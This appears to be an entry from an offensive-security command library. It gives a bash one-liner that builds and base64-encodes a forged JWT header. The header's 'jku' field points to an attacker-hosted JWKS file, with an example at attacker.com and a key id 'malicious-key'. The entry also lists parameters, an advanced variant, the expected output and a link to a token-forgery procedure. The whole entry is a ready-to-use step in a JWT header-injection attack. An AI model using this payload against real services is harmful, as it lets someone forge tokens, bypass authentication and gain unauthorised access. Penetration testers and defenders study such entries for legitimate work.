---
id: e783eab5-19fe-42f1-950d-99228bf41ecf
name: jwt-set-header-rs256-with-jku
type: command
executor: bash
data: >-
  echo
  '{"typ":"JWT","alg":"RS256","jku":"$_ATTACKER_JWKS_URL","kid":"$_KEY_ID"}' |
  base64 -w 0
output: null
created_at: '2023-04-06T03:56:00.839827+00:00'
updated_at: '2023-04-10T20:22:36.345573+00:00'
platforms:
  - Linux
  - macOS
tags:
  - jwt
  - header
  - jku
verified: true
validated: true
---

# jwt-set-header-rs256-with-jku

## Command

```bash
echo '{"typ":"JWT","alg":"RS256","jku":"$_ATTACKER_JWKS_URL","kid":"$_KEY_ID"}' | base64 -w 0
```

## Description

Creates and base64-encodes a JWT header specifying RS256 and injecting a malicious JWKS URL for key retrieval.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| $_ATTACKER_JWKS_URL | URL hosting the attacker's JWKS file | Yes |
| $_KEY_ID | Identifier for the key in JWKS | Yes |

## Examples

### Basic Usage

```bash
echo '{"typ":"JWT","alg":"RS256","jku":"https://attacker.com/jwks.json","kid":"malicious-key"}' | base64 -w 0
```

### Advanced Usage

```bash
echo '{"typ":"JWT","alg":"RS256","jku":"$_URL","kid":"$_ID","cty":"JWT"}' | base64 -w 0
```

## Expected Output

eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiIsImprdSI6Imh0dHBzOi8vYXR0YWNrZXIuY29tL2p3a3MuanNvbiIsImtpZCI6Im1hbGljaW91cy1rZXkifQ

## Related

- [[procedures/JWT-Token-Forgery-via-JWKS-Header-Injection]]
- [[commands/jwt-tool-sign-with-jku-injection]]
